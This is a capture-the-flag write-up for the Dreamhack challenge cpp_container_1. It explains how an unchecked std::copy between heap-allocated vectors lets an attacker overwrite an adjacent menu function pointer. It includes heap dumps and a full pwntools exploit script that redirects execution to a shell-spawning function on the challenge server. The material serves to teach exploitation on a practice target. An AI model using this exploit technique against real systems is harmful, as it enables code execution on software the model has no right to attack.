+++
date = '2026-05-13'
draft = false
title = 'Dreamhack cpp_container_1 Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(cpp_container_1)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾아 flag를 획득하세요!
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---


## Identifying the vulnerabilities

There is a win function.

We have a couple of vectors, which live in the heap, next to each other - `src` and `dest`.

Looking through the code, we can either populate the vectors, resize them, and then copy the data from `src` to `dest`.

The vectors are allocated on the heap like this:

```bash
0x617310        0x0000000000000000      0x0000000000000021      ........!.......
0x617320        0x0000004100000041      0x0000000000000041      A...A...A.......
0x617330        0x0000000000000000      0x0000000000000021      ........!.......
0x617340        0x0000000000000000      0x0000000000000000      ................
0x617350        0x0000000000000000      0x0000000000000021      ........!.......
0x617360        0x0000000000400f83      0x0000000000000000      ..@.............
0x617370        0x0000000000000000      0x0000000000020c91      ................         <-- Top chunk
You can try `set max-visualize-chunk-size 0x500` and re-run this command.
```

Right after the `dest` vector, `print_menu` is allocated; That's the function Menu calls every time it runs:

```c
while(1){
		menu->fp();
		std::cin >> selector;
		...
```

And looking at `copy`, there is no bounds checking:

```c
void copy_container(std::vector<int> &src, std::vector<int> &dest){
	std::copy(src.begin(), src.end(), dest.begin());
	std::cout << "copy complete!" << std::endl;
}
```

This means that if `src` is way bigger than `dest`, it's going to overwrite the data after `dest` anyways, because who cares.

When we `resize` a vector to be bigger, what happens is that it's going to free the current chunk and allocate a new one:

```bash
0x617310        0x0000000000000000      0x0000000000000021      ........!.......
0x617320        0x0000000000000617      0xc9fefa6dd306dc1b      ............m...         <-- tcachebins[0x20][0/1]
0x617330        0x0000000000000000      0x0000000000000021      ........!.......
0x617340        0x0000000000000000      0x0000000000000000      ................
0x617350        0x0000000000000000      0x0000000000000021      ........!.......
0x617360        0x0000000000400f83      0x0000000000000000      ..@.............
0x617370        0x0000000000000000      0x0000000000000051      ........Q.......
0x617380        0x0000000000000000      0x0000000000000000      ................
0x617390        0x0000000000000000      0x0000000000000000      ................
0x6173a0        0x0000000000000000      0x0000000000000000      ................
0x6173b0        0x0000000000000000      0x0000000000000000      ................
0x6173c0        0x0000000000000000      0x0000000000020c41      ........A.......         <-- Top chunk
```

So what we can do is resize the `src` to be a bigger size, say, 10, and then copy it over `dest`. That way, the `fp` function is going to be overwritten with whatever we want it to. For this to work of course, we aren't going to resize `dest` at all; letting it stay at size 3 should be fine.

Looking at the distance between the data in `src` and the `print_menu` function, to successfully overwrite it we would need to write 8 4-byte values to pad, and then the overwrite value itself. After that, we have to add another empty value, so it doesn't clobber the called value (because it's 8 bytes).

I populated it with some dummy data, and this is what the heap looks like:

```bash
0x617310        0x0000000000000000      0x0000000000000021      ........!.......
0x617320        0x0000000000000617      0xefb8b4c84348e8c7      ..........HC....         <-- tcachebins[0x20][0/1]
0x617330        0x0000000000000000      0x0000000000000021      ........!.......
0x617340        0x0000000100000001      0x0000000000000001      ................
0x617350        0x0000000000000000      0x0000000000000021      ........!.......
0x617360        0x0000000000400f83      0x0000000000000000      ..@.............
0x617370        0x0000000000000000      0x0000000000000031      ........1.......
0x617380        0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x617390        0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x6173a0        0x4141414143434343      0x0000000000020c61      CCCCAAAAa.......         <-- Top chunk
```

Now, if we copy from `src` to `dest`, we're going to get this:

```bash
0x401553 <main+174>    call   rax                         <0x4141414143434343>
```

So, that means it worked! Now, we just create the exploit, punch in the right values and we're good to go!


![challenge-screenshot](flag.png#center)


---

## The Exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/cpp_container1/cpp_container_1')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:23865'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
getshell =  0x401041

#first, resize src

p.recvuntil(b": ")
p.sendline(b"2")

#size src
p.recvuntil(b"size\n")
p.sendline(b"10")

#dest size
p.recvuntil(b"size\n")
p.sendline(b"3")

#populate
p.recvuntil(b": ")
p.sendline(b"1")

for _ in range(0,8):
    p.recvuntil(b": ")
    p.sendline(str(0x41414141))
    
    
p.recvuntil(b": ")
p.sendline(str(getshell))
 
p.recvuntil(b": ")
p.sendline(str(0x0))


for _ in range(0,3):
    p.recvuntil(b": ")
    p.sendline(b"1")

#now copy
p.recvuntil(b": ")
p.sendline(b"3")

p.interactive()
```


As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/cpp_container1.py)**.
